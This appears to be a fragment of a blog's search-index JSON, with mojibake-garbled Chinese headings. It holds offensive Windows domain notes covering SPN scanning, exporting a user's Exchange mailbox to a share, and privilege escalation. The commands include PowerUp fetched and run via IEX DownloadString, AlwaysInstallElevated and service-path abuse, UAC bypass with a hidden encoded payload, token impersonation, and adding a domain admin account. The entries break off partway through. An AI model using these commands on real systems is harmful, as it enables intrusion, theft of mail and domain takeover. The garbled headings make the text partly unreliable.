","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:9:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"SPN åœ¨åŸŸç¯å¢ƒä¸­çš„ä½¿ç”¨ ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"SPN æ‰«æ PowerShell-AD-Recon åˆ©ç”¨ SPN å‘ç°åŸŸä¸­æ‰€æœ‰çš„ MSSQL æœåŠ¡ Import-Module .\\Discover-PSMSSQLServer.ps1 Discover-PSMSSQLServers æ‰«æåŸŸä¸­æ‰€æœ‰çš„ SPN ä¿¡æ¯ Import-Module .\\Discover-PSInterestingServices.ps1 Discover-PSInterestingServices åœ¨ä¸ä½¿ç”¨ç¬¬ä¸‰æ–¹ Powershell è„šæœ¬çš„æƒ…å†µä¸‹ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤æŸ¥è¯¢æ‰€æœ‰çš„ SPN ä¿¡æ¯ setspn -T domain -q */* ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Exchange é‚®ä»¶æœåŠ¡å™¨æ”»å‡» ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Exchange æœåŠ¡å‘ç° åŸºäºç«¯å£æ‰«æå‘ç° nmap -A -O -sV IP SPN æŸ¥è¯¢ setspn -T pentest.hacker -F -Q */* ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Exchange çš„åŸºæœ¬æ“ä½œ æŸ¥çœ‹é‚®ä»¶æ•°æ®åº“ add-pssnapin microsoft.exchange* Get-MailboxDatabase -server \"Exchange1\" æŒ‡å®šæ•°æ®åº“ï¼Œå¯¹å…¶è¿›è¡Œè¯¦ç»†ä¿¡æ¯æŸ¥è¯¢ Get-MailboxDatabase -Identify 'Mailbox Database 1894576043' | Format-List Name,EdbFilePath,LogFolderPath è·å–ç°æœ‰ç”¨æˆ·çš„é‚®ä»¶åœ°å€ Get-Mailbox | format-tables Name,WindowsEmailAddress æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„é‚®ç®±ä½¿ç”¨ä¿¡æ¯ Get-Mailboxstatistics -identify administrator | Select DisplayName,ItemCount,TotalItemSize,LastLogonTime è·å–ç”¨æˆ·é‚®ç®±ä¸­çš„é‚®ä»¶æ•°é‡ Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | Sort-Object TotalItemSize -Decend ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¯¼å‡ºæŒ‡å®šçš„ç”µå­é‚®ä»¶ é…ç½®ç”¨æˆ·çš„å¯¼å…¥ã€å¯¼å‡ºæƒé™ æŸ¥çœ‹ç”¨æˆ·æƒé™ Get-ManagementRoleAssignment -role \"Mailbox Import Export\" | Format-List RoleAssigneeName æ·»åŠ æƒé™ New-ManagementRoleAssignment -Name \"Import Export_Domain Admins\" -User \"Administrator\" -Role \"Mailbox Import Export\" åˆ é™¤æƒé™ New-ManagementRoleAssignment \"Import Export_Domain Admins\" -Confirm:$false è®¾ç½®ç½‘ç»œå…±äº«æ–‡ä»¶å¤¹ net share inetpub=c:\\inetpub /grant:everyone,full å¯¼å‡ºç”¨æˆ·çš„ç”µå­é‚®ä»¶ New-MailboxExportRequest -Mailbox administrator -FilePath \\\\IP\\inetpub\\administrator.pst ç®¡ç†å¯¼å‡ºè¯·æ±‚ æŸ¥çœ‹ä¹‹å‰çš„å¯¼å‡ºè®°å½• Get-MailboxExportRequest å°†æŒ‡å®šç”¨æˆ·çš„å·²å®Œæˆå¯¼å‡ºè¯·æ±‚åˆ é™¤ Remove-MailboxExportRequest -Identify Administrator\\mailboxexport å°†æ‰€æœ‰å·²å®Œæˆå¯¼å‡ºçš„è¯·æ±‚åˆ é™¤ Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest ","date":"2020-02-17","objectID":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/:10:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","æ¨ªå‘ç§»åŠ¨"],"title":"åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æ","uri":"/2020/02/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æƒé™æå‡é˜²å¾¡åˆ†æ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æƒé™æå‡é˜²å¾¡åˆ†æ ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ‰‹åŠ¨æ‰§è¡Œå‘½ä»¤å‘ç°ç¼ºå¤±è¡¥ä¸ systeminfo wmic qfe get Caption,Description,HotfixID,InstalledOn å‘ç°è¡¥ä¸ç¼–å· wmic qfe get Caption,Description,HotfixID,InstalledOn | findstr C:\"KB3143141\" C:/\"KB976902\" ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:1:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows Exploit Suggester ä½¿ç”¨ systeminfo å‘½ä»¤è·å–å½“å‰ç³»ç»Ÿçš„è¡¥ä¸å®‰è£…çŠ¶å†µï¼Œå¹¶å°†ä¿¡æ¯å¯¼å…¥ patches.txt æ–‡ä»¶ä¸­ æ›´æ–°è¡¥ä¸ä¿¡æ¯ python windows-exploit-suggester.py --update æ£€æŸ¥æ¼æ´ python windows-exploit-suggester.py -d 2019-02-02-mssb.xls -i patches.txt Metasploit å†…ç½® local_exploit_suggester æ¨¡å— ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:1:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"powershell ä¸­çš„ sherlock è„šæœ¬ https://github.com/rasta-mouse/Sherlock import-module .\\Sherlock.ps1 Find-AllVulns https://github.com/rasta-mouse/Watson ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:1:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Windows é…ç½®é”™è¯¯åˆ©ç”¨ ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯ powerup https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc powershell.exe -exec bypass -Command \"\u0026{Import-Module .\\PowerUP.ps1;Invoke-AllChecks}\" powershell.exe -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks\" metasploit ä¸‹çš„åˆ©ç”¨ å¯¹åº”æ¨¡å— service_permissionsã€‚ ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ³¨å†Œè¡¨é”® AlwaysInstallElevated AlwaysInstallElevated æ˜¯ä¸€ä¸ªç­–ç•¥è®¾ç½®ã€‚å¾®è½¯å…è®¸éæˆæƒç”¨æˆ·ä»¥ SYSTEM æƒé™è¿è¡Œå®‰è£…æ–‡ä»¶(MSI)ï¼Œå¦‚æœç”¨æˆ·å¯ç”¨æ­¤ç­–ç•¥è®¾ç½®ï¼Œé‚£ä¹ˆé»‘å®¢åˆ©ç”¨æ¶æ„çš„ MSI æ–‡ä»¶å°±å¯ä»¥è¿›è¡Œç®¡ç†å‘˜æƒé™çš„æå‡ã€‚å‡è®¾æˆ‘ä»¬æ‹¿åˆ°ç›®æ ‡ä¸»æœºçš„ Meterpreter ä¼šè¯åå¹¶æ²¡èƒ½é€šè¿‡ä¸€äº›å¸¸è§„æ–¹å¼å–å¾— SYSTEM æƒé™ï¼Œé‚£ä¹ˆ AlwaysInstallElevated ææƒå¯ä»¥ç»™æˆ‘ä»¬å¸¦æ¥å¦ä¸€æ¡æ€è·¯ã€‚ æ‰‹åŠ¨æ£€æµ‹æ³¨å†Œè¡¨ï¼š reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated å¦‚æœå€¼å‡ä¸º 1ï¼Œè¯´æ˜å­˜åœ¨é£é™© PowerUp è„šæœ¬ powershell.exe -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Get-RegistryAlwaysInstallElevated\" æ·»åŠ è´¦æˆ· Write-UserAddMSI ä»¥æ™®é€šç”¨æˆ·è¿è¡Œ msiexec /q /i UserAdd.smi ä¹Ÿå¯ä»¥åˆ©ç”¨ msf ä¸­çš„ always_install_elevated æ¨¡å— ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´ metasploit ä¸‹çš„åˆ©ç”¨ æ£€æµ‹ç›®æ ‡æœºå™¨æ˜¯å¦å­˜åœ¨æ¼æ´ wmic service get name,displayname,pathname,startmode|findstr /i \"Auto\" | findstr /i /v \"C:\\Windows\\\\\"|findstr /i /v \"\"\" æŠŠè¦ä¸Šä¼ çš„ç¨‹åºé‡å‘½åå¹¶æ”¾ç½®åœ¨æ­¤æ¼æ´ä¸”å¯å†™çš„ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š sc stop service_name sc start service_name ä¹Ÿå¯ä»¥ä½¿ç”¨ msf ä¸­çš„ Windows Service Trusted Path Privilege Escalation æ¨¡å—è¿›è¡Œæµ‹è¯• æ³¨æ„ï¼š msf è¦è®¾ç½® set AutoRunScript migrate -f é˜²æ­¢æ‰çº¿ ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è‡ªåŠ¨å®‰è£…é…ç½®æ–‡ä»¶ dir /b /s c:\\Unattend.xml dir /b /s c:\\sysprep.xml æŸ¥çœ‹æ–‡ä»¶ä¸­çŸ¥å¦å­˜åœ¨ base64 åŠ å¯†çš„å¯†ç  msf ä¸­é›†æˆäº†è¯¥æ¼æ´çš„åˆ©ç”¨æ¨¡å— post/windows/gather/enum_unattend ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è®¡åˆ’ä»»åŠ¡ æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ schtasks /query /fo LIST /v æŸ¥è¯¢å¯å†™çš„è®¡åˆ’ä»»åŠ¡æ–‡ä»¶å¤¹ accesschk.exe -dqc \"C:\\Microsoft\" -accepteula åˆ—å‡ºæŸä¸ªé©±åŠ¨å™¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶å¤¹ accesschk.exe -uwdqsUsersc:\\ accesschk.exe -uwdqs\"AuthenticatedUsers\"c:\\ åˆ—å‡ºæŸä¸ªé©±åŠ¨å™¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶ accesschk.exe -uwdqsUsersc:\\*.* accesschk.exe -uwdqs\"AuthenticatedUsers\"c:\\*.* ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:5","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Empire å†…ç½®æ¨¡å— usermode privesc/powerup/xxxx ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:2:6","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ç»•è¿‡ UAC ææƒ ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"bypassuac æ¨¡å— å‰æï¼šå½“å‰ç”¨æˆ·å¿…é¡»åœ¨ç®¡ç†å‘˜ç»„ä¸­ exploit/windows/local/bypassuac exploit/windows/local/bypassuac_inject getsystem ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"RunAs æ¨¡å— exploit/windows/local/ask å¼¹å‡ºä¸€ä¸ª UAC æ¡†ï¼Œç”¨æˆ·ç‚¹å‡»åä¼šå¼¹å›ä¸€ä¸ªé«˜æƒé™çš„ shell getuid æŸ¥çœ‹æƒé™ï¼Œå¦‚æœæ˜¯æ™®é€šç”¨æˆ·æƒé™ï¼Œæ‰§è¡Œ getsystem ææƒ ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Nishang ä¸­çš„ Invoke-PsUACme æ¨¡å— Invoke-PsUACme -Verbose ## ä½¿ç”¨Sysprepæ–¹æ³•å¹¶æ‰§è¡Œé»˜è®¤çš„Payload Invoke-PsUACme -method oobe -Verbose ## ä½¿ç”¨oobeæ–¹æ³•æ–¹æ³•å¹¶æ‰§è¡Œé»˜è®¤çš„Payload Invoke-PsUACme -Payload \"powershell -windowstyle hidden -e YourEncodedPayload\" ## ä½¿ç”¨-Payloadå‚æ•°ï¼Œå¯ä»¥è‡ªè¡ŒæŒ‡å®šè¦æ‰§è¡Œçš„Payload ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Empire ä¸­çš„ bypassuac æ¨¡å— bypassuac æ¨¡å— usemode privesc/bypassuac execute bypassuac_wscript æ¨¡å— usemode privesc/bypassuac_wscript execute ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:3:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"ä»¤ç‰Œçªƒå– ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"msf ä¸Šçš„ä»¤ç‰Œçªƒå– å‡è®¾å·²ç»è·å–äº† meterpreter shell use incognito list_tokens -u åœ¨ incognito ä¸­è°ƒç”¨ impersonate_token impersonate_token DESKTOP-DUNPKQ9\\\\Administrator æ³¨æ„ï¼šåœ¨è¾“å…¥ä¸»æœºå \\ ç”¨æˆ·åæ—¶ï¼Œéœ€è¦è¾“å…¥ä¸¤ä¸ªåæ–œæ  ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Rotten Potato æœ¬åœ°ææƒ use incognito list_tokens -u execute -HC -f rottenpotato.exe impersonate_token \"NT AUTHORITY\\\\SYSTEM\" ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ·»åŠ åŸŸç®¡ç†å‘˜ å‡è®¾ç½‘ç»œä¸­è®¾ç½®äº†åŸŸç®¡è¿›ç¨‹ï¼Œåœ¨ meterpreter shell ä¸­è¿ç§»è¿›ç¨‹è‡³åŸŸç®¡è¿›ç¨‹ä¸­ net user test test123!@# /ad /domain net group \"domain admins\" test /ad /domain åŒæ ·ï¼Œåœ¨ meterpreter shell ä¸­å¯ä»¥ä½¿ç”¨ incognito æ¥æ¨¡æ‹ŸåŸŸç®¡ç†å‘˜ï¼Œç„¶åé€šè¿‡è¿­ä»£ç³»ç»Ÿä¸­æ‰€æœ‰å¯ç”¨çš„èº«ä»½éªŒè¯ä»¤ç‰Œæ¥æ·»åŠ åŸŸç®¡ç†å‘˜ã€‚ åœ¨æ´»åŠ¨çš„ meterpreter shell ä¸­æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š add_user test test!@#123 -h 1.1.1.2 æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°†è¯¥è´¦æˆ·åŠ åˆ°åŸŸç®¡ç†å‘˜ç»„ä¸­ã€‚ add_user \"Domain Admins\" test -h 1.1.1.2 ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"Empire ä¸‹çš„ä»¤ç‰Œçªƒå–åˆ†æ è¿è¡Œ mimikatzï¼Œè¾“å…¥ creds æ‰§è¡Œ: pth CredID ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:4:4","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"æ— å‡­è¯ä¸‹çš„æƒé™è·å– ","date":"2020-02-15","objectID":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/:5:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€"],"title":"æƒé™æå‡é˜²å¾¡åˆ†æ","uri":"/2020/02/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E9%98%B2%E5%BE%A1%E5%88%86%E6%9E%90/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"LLMNR å’Œ NetBIOS æ¬ºéª—æ”»å‡» Responder å·¥å…· å¼€å¯ç›‘å¬æ¨¡å¼ 